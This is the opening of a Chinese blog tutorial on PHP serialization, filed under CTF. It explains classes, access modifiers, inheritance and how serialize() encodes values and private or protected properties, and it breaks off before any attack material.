<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>深入浅出PHP反序列化 | P4tt0n's b10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP反序列化 程序开发：面向过程VS面向对象 面向过程： 面向过程是一种以整体事件为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。 面向对象： 面向对象是一种以对象为中心的编程思想，把要解决的问题分解成各个对象； 对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。 类的基础类的定义类是定义了一件事物的抽">
<meta property="og:type" content="article">
<meta property="og:title" content="深入浅出PHP反序列化">
<meta property="og:url" content="https://p4tt0n.github.io/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="P4tt0n's b10g">
<meta property="og:description" content="PHP反序列化 程序开发：面向过程VS面向对象 面向过程： 面向过程是一种以整体事件为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。 面向对象： 面向对象是一种以对象为中心的编程思想，把要解决的问题分解成各个对象； 对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。 类的基础类的定义类是定义了一件事物的抽">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
<meta property="article:published_time" content="2024-07-31T12:27:32.000Z">
<meta property="article:modified_time" content="2024-07-31T13:12:21.296Z">
<meta property="article:author" content="P4tt0n">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
      const saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
      
      window.btf = {
        saveToLocal: saveToLocal,
        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
          const script = document.createElement('script')
          script.src = url
          script.async = true
          script.onerror = reject
          script.onload = script.onreadystatechange = function() {
            const loadState = this.readyState
            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
            script.onload = script.onreadystatechange = null
            resolve()
          }

          Object.keys(attr).forEach(key => {
            script.setAttribute(key, attr[key])
          })

          document.head.appendChild(script)
        }),

        getCSS: (url, id = false) => new Promise((resolve, reject) => {
          const link = document.createElement('link')
          link.rel = 'stylesheet'
          link.href = url
          if (id) link.id = id
          link.onerror = reject
          link.onload = link.onreadystatechange = function() {
            const loadState = this.readyState
            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
            link.onload = link.onreadystatechange = null
            resolve()
          }
          document.head.appendChild(link)
        }),

        addGlobalFn: (key, fn, name = false, parent = window) => {
          const pjaxEnable = false
          if (!pjaxEnable && key.startsWith('pjax')) return

          const globalFn = parent.globalFn || {}
          const keyObj = globalFn[key] || {}
    
          if (name && keyObj[name]) return
    
          name = name || Object.keys(keyObj).length
          keyObj[name] = fn
          globalFn[key] = keyObj
          parent.globalFn = globalFn
        }
      }
    
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode
      
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })()</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '深入浅出PHP反序列化',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-31 21:12:21'
}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/modify.css"><link rel="stylesheet" href="./themes/butterfly/source/css/transpancy.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's b10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"><span class="site-name">P4tt0n's b10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">深入浅出PHP反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-31T12:27:32.000Z" title="发表于 2024-07-31 20:27:32">2024-07-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-31T13:12:21.296Z" title="更新于 2024-07-31 21:12:21">2024-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>48分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="深入浅出PHP反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg');"></div><article class="post-content" id="article-container"><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><hr>
<p>程序开发：面向过程VS面向对象</p>
<p>面向过程：</p>
<p>面向过程是一种以整体事件为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。</p>
<p>面向对象：</p>
<p>面向对象是一种以对象为中心的编程思想，把要解决的问题分解成各个对象；</p>
<p>对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。</p>
<h2 id="类的基础"><a href="#类的基础" class="headerlink" title="类的基础"></a>类的基础</h2><h3 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h3><p>类是定义了一件事物的抽象特点，他将数据的形式以及这些数据上的操作封装在一起</p>
<p>对象是具有类类型的变量，是对类的实例</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">内部构成：成员变量（属性）+成员函数  （方法）</span><br></pre></td></tr></tbody></table></figure>

<p>成员变量：定义在类内部的变量。该变量的值对外是不可见的。但是可以通过成员函 eE数访问。在类被实例化成为对象后，该变量即可成为对象的属性</p>
<p>成员函数：定义在类内部，可用于访问对象的数据</p>
<p>继承：继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系</p>
<p>父类：一个类被其它类继承，可将该类称为父类，基类，超类</p>
<p>子类：一个类继承其他类，可将其称为子类或者派生类</p>
<h3 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h3><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_Name</span></span>{</span><br><span class="line">    <span class="comment">//成员属性</span></span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>



<h3 id="类的内容"><a href="#类的内容" class="headerlink" title="类的内容"></a>类的内容</h3><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h3 id="实例化和赋值"><a href="#实例化和赋值" class="headerlink" title="实例化和赋值"></a>实例化和赋值</h3><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'掌握了：'</span>.<span class="variable">$var1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$patton</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="variable">$patton</span> -&gt; name = <span class="string">'P4tt0n'</span>;</span><br><span class="line"><span class="variable">$patton</span> -&gt; sex = <span class="string">'man'</span>;</span><br><span class="line"><span class="variable">$patton</span> -&gt; <span class="title function_ invoke__">jineng</span>(<span class="string">'play football'</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$patton</span>);</span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">P4tt0nplay footballhero Object</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; P4tt0n</span><br><span class="line">    [sex] =&gt; man</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h3><p>可以在类中声明多个变量，即对象中可以有多个成员属性，每个变量都存储着对象的不同属性信息。</p>
<p>访问权限修饰符：对属性的定义</p>
<p>pubic：公共的，在类的内部、子类、或者外部都可调用，不受限制</p>
<p>private：私有的，只有在类的内部使用</p>
<p>protected：受保护的，在类的内部或者子类中使用</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">'P4tt0n'</span>;        <span class="comment">//公共的</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>=<span class="string">'man'</span>;           <span class="comment">//私有的</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$shengao</span> = <span class="string">'188'</span>;   <span class="comment">//受保护的</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$patton</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$patton</span> -&gt; name;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$patton</span> -&gt; sex;               <span class="comment">//报错</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$patton</span> -&gt; shengao;           <span class="comment">//报错</span></span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">'P4tt0n'</span>;        <span class="comment">//公共的</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>=<span class="string">'man'</span>;           <span class="comment">//私有的</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$shengao</span> = <span class="string">'188'</span>;   <span class="comment">//受保护的</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero2</span> <span class="title">ectends</span> <span class="title">hero</span></span>{</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>{</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name; </span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; sex;          <span class="comment">//子类不可用</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; shengao;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$patton</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="variable">$patton2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hero2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$patton</span> -&gt; name;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$patton2</span> -&gt; <span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//P4tt0nP4tt0n188</span></span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Students</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$school</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Read</span>(<span class="params"></span>)</span>{</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Listen</span>(<span class="params"></span>)</span>{</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>



<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><h3 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h3><p>序列化是将对象的状态信息（属性）转换为可以存储或传输的形式的过程。</p>
<p>对象——(序列化)——-&gt;字符串</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span> = <span class="string">"dazzhuang"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$number</span> = <span class="number">34</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">'user'</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">10</span>, <span class="string">'b'</span> =&gt; <span class="number">200</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">'uu'</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">'uu'</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span>-&gt;data = &amp;<span class="variable">$test2</span>-&gt;data2;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">i:34;</span></span><br><span class="line"><span class="comment">s:4:"user";</span></span><br><span class="line"><span class="comment">b:1;</span></span><br><span class="line"><span class="comment">N;</span></span><br><span class="line"><span class="comment">a:2:{s:1:"a";i:10;s:1:"b";i:200;}</span></span><br><span class="line"><span class="comment">O:4:"TEST":3:{s:4:"data";s:2:"uu";s:5:"data2";s:9:"dazzhuang";s:10:" TEST pass";b:1;}</span></span><br><span class="line"><span class="comment">O:4:"TEST":3:{s:4:"data";s:9:"dazzhuang";s:5:"data2";R:2;s:10:" TEST pass";b:1;}</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<h3 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h3><p>不能序列化类，可以序列化对象</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span> = <span class="string">'benben'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; pub;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4:"test":1:{s:3:"pub";s:6:"benben";}</span></span><br></pre></td></tr></tbody></table></figure>



<p>private私有属性序列化时，在变量名前面加%00类名%00</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pub</span> = <span class="string">'benben'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; pub;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4:"test":1:{s:9:" test pub";s:6:"benben";}</span></span><br><span class="line"><span class="comment">//O%3A4%3A%22test%22%3A1%3A%7Bs%3A9%3A%22%00test%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<p>protected受保护属性序列化时，在变量名前面加%00*%00</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pub</span> = <span class="string">'benben'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; pub;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:4:"test":1:{s:6:" * pub";s:6:"benben";}</span></span><br><span class="line"><span class="comment">//O%3A4%3A%22test%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D</span></span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pub</span> = <span class="string">'benben'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; pub;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>{</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ben</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; ben = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span 